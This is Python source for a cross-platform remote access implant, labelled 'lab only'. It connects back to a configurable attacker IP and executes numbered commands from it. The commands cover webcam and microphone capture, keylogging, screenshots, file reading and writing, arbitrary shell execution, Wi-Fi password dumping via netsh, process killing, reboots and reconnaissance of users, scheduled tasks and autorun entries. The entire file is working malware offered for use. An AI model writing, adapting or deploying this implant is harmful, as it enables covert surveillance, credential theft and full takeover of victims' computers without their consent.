# implant_full.py → RUN ON TARGET (Windows/macOS/Linux) — LAB ONLY
import socket, threading, subprocess, os, platform, time, pyautogui, wave, webbrowser, ctypes, psutil, netifaces, requests
from PIL import ImageGrab
from datetime import datetime

# === OPTIONAL IMPORTS (cross-platform safe) ===
try: import pyaudio; AUDIO = True
except: AUDIO = False
try: import cv2; CV = True
except: CV = False
try: from pynput import keyboard; listener = None
except: listener = None

# === CONFIG — CHANGE TO YOUR ATTACKER IP ===
ATTACKER = "192.168.1.100"   # ← CHANGE THIS
PORT = 9999

# Global state
camera_on = threading.Event()
mic_on = threading.Event()
keys = []

def on_key(k):
    try: keys.append(k.char if hasattr(k, 'char') else f'[{k}]')
    except: keys.append('[ERR]')

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER, PORT))
            s.sendall(f"[IMPLANT ONLINE] {platform.system()} {platform.node()} {os.getlogin()}".encode())
            handler(s)
        except:
            time.sleep(5)

def handler(s):
    global listener
    while True:
        try:
            data = s.recv(1024).decode().strip()
            if not data: break
            cmd, payload = (data.split(' ',1) + ['',''])[:2]

            resp = ""

            if cmd == "1":
                if CV: camera_on.set(); threading.Thread(target=lambda: [cap:=cv2.VideoCapture(0)] and [[ret,frame:=cap.read() and cv2.imshow('CAM',frame) or None] for _ in iter(int,1) if camera_on.is_set() or cv2.waitKey(1)==ord('q')],daemon=True).start(); resp = "[+] Camera ON"
                else: resp = "[-] OpenCV missing"
            elif cmd == "2": camera_on.clear(); resp = "[+] Camera OFF"
            elif cmd == "3":
                if AUDIO: mic_on.set(); threading.Thread(target=lambda: [p:=pyaudio.PyAudio(), stream:=p.open(format=pyaudio.paInt16,channels=1,rate=44100,input=True,frames_per_buffer=1024), frames:=[], [frames.append(stream.read(1024)) for _ in range(441) if mic_on.is_set()], stream.stop_stream(), stream.close(), p.terminate(), wf:=wave.open("audio.wav","wb"), wf.setnchannels(1), wf.setsampwidth(2), wf.setframerate(44100), wf.writeframes(b''.join(frames)), wf.close()],daemon=True).start(); resp = "[+] Recording 10s..."
                else: resp = "[-] PyAudio missing"
            elif cmd == "4": mic_on.clear(); resp = "[+] Mic stopped"
            elif cmd == "5":
                if listener is None and keyboard: listener = keyboard.Listener(on_press=on_key); listener.start(); resp = "[+] Keylogger started"
            elif cmd == "6":
                if listener: listener.stop(); listener = None; resp = "[+] Keylogger stopped"
            elif cmd == "7": resp = ''.join(keys[-3000:]); keys.clear()
            elif cmd == "8": ImageGrab.grab().save("screenshot.png"); resp = "[+] Screenshot saved"
            elif cmd == "9": resp = '\n'.join(os.listdir(payload or '.'))
            elif cmd == "10": resp = open(payload,"r",errors="ignore").read() if os.path.isfile(payload) else "File not found"
            elif cmd == "11":
                path, content = payload.split('\n',1); open(path,"w").write(content); resp = "[+] File written"
            elif cmd == "12": resp = '\n'.join([f"{p.pid} {p.name()}" for p in psutil.process_iter()[:200]])
            elif cmd == "13": psutil.Process(int(payload)).terminate(); resp = "[+] Process killed"
            elif cmd == "14": resp = "Port scan placeholder"
            elif cmd == "15": resp = subprocess.getoutput(payload)
            elif cmd == "16": resp = f"{platform.system()} {platform.release()} | {platform.machine()} | {os.getlogin()}"
            elif cmd == "17": resp = '\n'.join(netifaces.interfaces())
            elif cmd == "18": resp = '\n'.join([str(c) for c in psutil.net_connections()[:50]])
            elif cmd == "19": resp = str(netifaces.gateways())
            elif cmd == "20": resp = str(psutil.net_if_stats())
            elif cmd == "21": resp = subprocess.getoutput("net user" if "Win" in platform.system() else "whoami")
            elif cmd == "22": os.system("shutdown /r /t 5" if "Win" in platform.system() else "shutdown -r now"); resp = "[+] Rebooting..."
            elif cmd == "23":
                if "Win" in platform.system(): ctypes.windll.user32.LockWorkStation(); resp = "[+] Screen locked"
            elif cmd == "24": webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); resp = "RICK ROLL SENT"
            elif cmd == "25": s.sendall(b"3"); resp = "Using command 3"
            elif cmd == "26": x,y = map(int,payload.split()); pyautogui.moveTo(x,y); resp = f"Moved to {x},{y}"
            elif cmd == "27": pyautogui.click(); resp = "[+] Clicked"
            elif cmd == "28":
                if "Win" in platform.system():
                    profiles = [l.split(":")[1].strip() for l in subprocess.getoutput("netsh wlan show profiles").split('\n') if "All User Profile" in l]
                    out = ""
                    for p in profiles:
                        key = subprocess.getoutput(f'netsh wlan show profile name="{p}" key=clear')
                        pw = [l for l in key.split('\n') if "Key Content" in l]
                        out += f"{p}: {pw[0].split(':')[1].strip() if pw else 'None'}\n"
                    resp = out
                else: resp = "Wi-Fi dump: Windows only"
            elif cmd == "29": resp = subprocess.getoutput("wmic product get name" if "Win" in platform.system() else "ls /Applications")
            elif cmd == "30": resp = subprocess.getoutput("Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\* -File | Sort LastWriteTime -Desc | Select -First 10" if "Win" in platform.system() else "ls -lt ~ | head -10")
            elif cmd == "31": resp = subprocess.getoutput('reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' if "Win" in platform.system() else "ls ~/Library/LaunchAgents")
            elif cmd == "32": resp = subprocess.getoutput("schtasks /query" if "Win" in platform.system() else "crontab -l")
            elif cmd == "33": resp = subprocess.getoutput("net user" if "Win" in platform.system() else "users")
            elif cmd == "34": resp = subprocess.getoutput("wevtutil qe System /c:10" if "Win" in platform.system() else "last -10")
            elif cmd == "35": resp = requests.get(payload).text[:10000]

            s.sendall(resp.encode() + b"\nEND\n")
        except Exception as e:
            s.sendall(f"ERROR: {e}".encode())
            break
    s.close()

threading.Thread(target=connect, daemon=True).start()
while True: time.sleep(100)
